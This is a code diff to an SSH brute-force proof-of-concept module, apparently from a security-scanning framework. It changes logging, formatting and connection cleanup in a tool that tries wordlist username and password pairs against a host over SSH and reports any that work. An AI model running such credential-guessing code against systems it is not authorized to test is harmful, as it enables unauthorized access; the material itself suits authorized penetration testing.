@@ -4,6 +4,7 @@
 # CreatedDate: 2021/1/14 10:01
 # Description:
 import itertools
+import logging
 import queue
 import socket
 
@@ -11,6 +12,7 @@ import paramiko
 
 from lib.core.data import paths, logger
 from lib.core.enums import VUL_TYPE, POC_CATEGORY
+from lib.core.log import LOGGER
 from lib.core.poc import POCBase, Output
 from lib.core.register import register_poc
 from lib.core.threads import run_threads
@@ -20,7 +22,7 @@ result_queue = queue.Queue()
 
 
 class DemoPOC(POCBase):
-    vulID = '333'
+    vulID = '0001'
     version = 1
     author = ['liang.ma']
     vulDate = '2021-01-14'
@@ -55,21 +57,20 @@ class DemoPOC(POCBase):
         ssh_burst(host, port)
 
         if not result_queue.empty():
-            username,password = result_queue.get()
+            username, password = result_queue.get()
             result['VerifyInfo'] = {}
             result['VerifyInfo']['URL'] = self.url
             result['VerifyInfo']['Username'] = username
             result['VerifyInfo']['Password'] = password
         return self.parse_attack(result)
-    def parse_attack(self,result):
+
+    def parse_attack(self, result):
         output = Output(self)
         if result:
             output.success(result)
         else:
             output.fail('target is not vulnerable')
             return output
-
-
 
 
 def get_word_list():
@@ -115,9 +116,11 @@ def ssh_login(host, port, username=None, password=None) -> int:
             return ret
         else:
             ret = 1
-        ssh.close()
     except Exception:
         pass
+    finally:
+        if ssh:
+            ssh.close()
 
     return ret
 
@@ -125,12 +128,13 @@ def ssh_login(host, port, username=None, password=None) -> int:
 def task_init(host, port):
     for username, password in get_word_list():
         task_queue.put((host, port, username.strip(), password.strip()))
+        logger.info('username: {} password:{}'.format(username, password))
 
 
 def task_thread():
     while not task_queue.empty():
         host, port, username, password = task_queue.get()
-        logger.info('try burst {}:{} use username: {} password:{}'.format(host, port, username, password))
+        logger.debug('try burst {}:{} use username: {} password:{}'.format(host, port, username, password))
         status = ssh_login(host, port, username, password)
         if status == 1:
             with task_queue.mutex:
@@ -142,7 +146,9 @@ def task_thread():
 
 
 def ssh_burst(host, port):
+    logger.debug('use {} poc'.format(__file__))
     if not port_check(host, port):
+        logger.debug('target {} is Unreachable'.format(host))
         return
     try:
         task_init(host, port)
